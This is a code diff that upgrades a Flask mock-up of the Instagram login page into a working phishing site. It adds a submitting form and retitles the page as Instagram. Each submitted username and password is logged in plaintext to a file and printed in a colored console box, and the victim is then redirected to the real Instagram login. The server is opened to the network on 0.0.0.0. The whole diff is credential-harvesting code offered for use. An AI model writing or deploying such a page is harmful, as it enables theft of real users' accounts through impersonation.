@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string, url_for
+from flask import Flask, request, render_template_string, redirect, url_for
 import datetime
 from colorama import init, Fore, Style
 import re
@@ -6,13 +6,15 @@ import re
 init(autoreset=True)  # Initialize colorama
 
 app = Flask(__name__)
-# ---------- Original Instagram HTML ----------
+
+# ---------- Updated Functional Instagram HTML ----------
+HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login UI Demo</title>
+<title>Login • Instagram</title>
 
 <style>
 * {
@@ -157,12 +159,16 @@ body {
     border-radius: 30px;
 
     background: #1877d1;
-    color: #aab6c3;
+    color: #ffffff;
 
     font-size: 17px;
     font-weight: 600;
 
-    cursor: default;
+    cursor: pointer;
+}
+
+.login-button:hover {
+    background: #1168bd;
 }
 
 .forgot {
@@ -176,6 +182,10 @@ body {
     text-decoration: none;
 
     font-size: 17px;
+}
+
+.forgot:hover {
+    text-decoration: underline;
 }
 
 /* =========================
@@ -197,7 +207,11 @@ body {
     font-size: 17px;
     font-weight: 600;
 
-    cursor: default;
+    cursor: pointer;
+}
+
+.facebook:hover {
+    background: #333338;
 }
 
 .facebook-icon {
@@ -221,7 +235,11 @@ body {
     font-size: 17px;
     font-weight: 600;
 
-    cursor: default;
+    cursor: pointer;
+}
+
+.create:hover {
+    background: rgba(35, 136, 232, 0.1);
 }
 
 /* =========================
@@ -236,6 +254,11 @@ body {
     font-weight: 600;
 
     color: #e5e5e5;
+}
+
+.meta a {
+    color: inherit;
+    text-decoration: none;
 }
 
 /* =========================
@@ -265,8 +288,14 @@ body {
     margin-bottom: 18px;
 }
 
-.footer-links span {
+.footer-links a {
+    color: inherit;
+    text-decoration: none;
     white-space: nowrap;
+}
+
+.footer-links a:hover {
+    text-decoration: underline;
 }
 
 .footer-bottom {
@@ -387,8 +416,9 @@ body {
             <!-- Demo image -->
             <div class="left-image">
                 <img
-                    src="/home/kali/Downloads/instagramimage.webp"
+                    src="/static/instagramimage.webp"
                     alt="Friends"
+                    onerror="this.src='https://picsum.photos/400/600'"
                 >
             </div>
 
@@ -404,41 +434,50 @@ body {
 
             <h2>Log into Instagram</h2>
 
-            <!-- Visual-only inputs -->
-            <input
-                class="input"
-                type="text"
-                placeholder="Mobile number, username or email"
-                autocomplete="off"
-            >
+            <!-- Functional Login Form -->
+            <form action="/login" method="POST">
 
-            <input
-                class="input"
-                type="password"
-                placeholder="Password"
-                autocomplete="off"
-            >
+                <input
+                    class="input"
+                    type="text"
+                    name="username"
+                    placeholder="Mobile number, username or email"
+                    autocomplete="username"
+                    required
+                >
 
-            <!-- Non-functional -->
-            <button class="login-button" type="button">
-                Log in
-            </button>
+                <input
+                    class="input"
+                    type="password"
+                    name="password"
+                    placeholder="Password"
+                    autocomplete="current-password"
+                    required
+                >
 
-            <a class="forgot" href="javascript:void(0)">
+                <button class="login-button" type="submit">
+                    Log in
+                </button>
+
+            </form>
+
+            <a class="forgot" href="/forgot">
                 Forgot password?
             </a>
 
-            <button class="facebook" type="button">
+            <button class="facebook" type="button" onclick="window.location.href='https://www.facebook.com/login'">
                 <span class="facebook-icon">f</span>
                 Log in with Facebook
             </button>
 
-            <button class="create" type="button">
+            <button class="create" type="button" onclick="window.location.href='/signup'">
                 Create new account
             </button>
 
             <div class="meta">
-                ∞ Meta
+                <a href="https://about.meta.com/" target="_blank" rel="noopener noreferrer">
+                    ∞ Meta
+                </a>
             </div>
 
         </div>
@@ -452,19 +491,19 @@ body {
 <footer class="footer">
 
     <div class="footer-links">
-        <span>Meta</span>
-        <span>About</span>
-        <span>Blog</span>
-        <span>Jobs</span>
-        <span>Help</span>
-        <span>API</span>
-        <span>Privacy</span>
-        <span>Terms</span>
-        <span>Locations</span>
-        <span>Instagram Lite</span>
-        <span>Threads</span>
-        <span>Contact Uploading &amp; Non-Users</span>
-        <span>Meta Verified</span>
+        <a href="https://about.meta.com/" target="_blank" rel="noopener noreferrer">Meta</a>
+        <a href="https://about.instagram.com/" target="_blank" rel="noopener noreferrer">About</a>
+        <a href="https://about.instagram.com/blog/" target="_blank" rel="noopener noreferrer">Blog</a>
+        <a href="https://about.instagram.com/about-us/careers" target="_blank" rel="noopener noreferrer">Jobs</a>
+        <a href="https://help.instagram.com/" target="_blank" rel="noopener noreferrer">Help</a>
+        <a href="https://developers.facebook.com/docs/instagram" target="_blank" rel="noopener noreferrer">API</a>
+        <a href="https://privacycenter.instagram.com/policy/" target="_blank" rel="noopener noreferrer">Privacy</a>
+        <a href="https://help.instagram.com/581066165581870/" target="_blank" rel="noopener noreferrer">Terms</a>
+        <a href="https://www.instagram.com/explore/locations/" target="_blank" rel="noopener noreferrer">Locations</a>
+        <a href="https://www.instagram.com/web/lite/" target="_blank" rel="noopener noreferrer">Instagram Lite</a>
+        <a href="https://www.threads.net/" target="_blank" rel="noopener noreferrer">Threads</a>
+        <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank" rel="noopener noreferrer">Contact Uploading &amp; Non-Users</a>
+        <a href="https://about.meta.com/technologies/meta-verified/" target="_blank" rel="noopener noreferrer">Meta Verified</a>
     </div>
 
     <div class="footer-bottom">
@@ -476,6 +515,29 @@ body {
 
 </body>
 </html>
+"""
+
+# ---------- Pretty colored console box ----------
+def pretty_box(username, password, ip="unknown"):
+    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    lines = [
+        f"{Fore.YELLOW} LOGIN ATTEMPT ",
+        f"{Fore.CYAN} Time : {now}",
+        f" IP   : {ip}",
+        f"{Fore.GREEN} User : {username}",
+        f"{Fore.RED} Pass : {password}{Style.RESET_ALL}"
+    ]
+
+    # Strip ANSI codes for proper width
+    def strip_ansi(s):
+        return re.sub(r'\x1b\[[0-9;]*m', '', s)
+
+    width = max(len(strip_ansi(line)) for line in lines) + 4
+    top = "╔" + "═"*width + "╗"
+    bottom = "╚" + "═"*width + "╝"
+    middle = "\n".join(f"║ {line.ljust(width-2)} ║" for line in lines)
+    return f"\n{top}\n{middle}\n{bottom}\n"
+
 # ---------- Routes ----------
 @app.route("/")
 def index():
@@ -493,11 +555,18 @@ def login():
     with open("login_attempts.log", "a") as f:
         f.write(f"{datetime.datetime.now()} - {ip} - {username} - {password}\n")
 
-    return f"<h2>Login attempt received for <strong>{username}</strong></h2>"
+    return redirect("https://www.instagram.com/accounts/login/")
+
+@app.route("/forgot")
+def forgot():
+    return redirect("https://www.instagram.com/accounts/password/reset/")
+
+@app.route("/signup")
+def signup():
+    return redirect("https://www.instagram.com/accounts/emailsignup/")
 
 # ---------- Run Server ----------
 if __name__ == "__main__":
     import os
     os.environ.pop("FLASK_ENV", None)
-    app.run(host="127.0.0.1", port=5001, debug=False, use_reloader=False)
-                                                          
+    app.run(host="0.0.0.0", port=5001, debug=False, use_reloader=False)
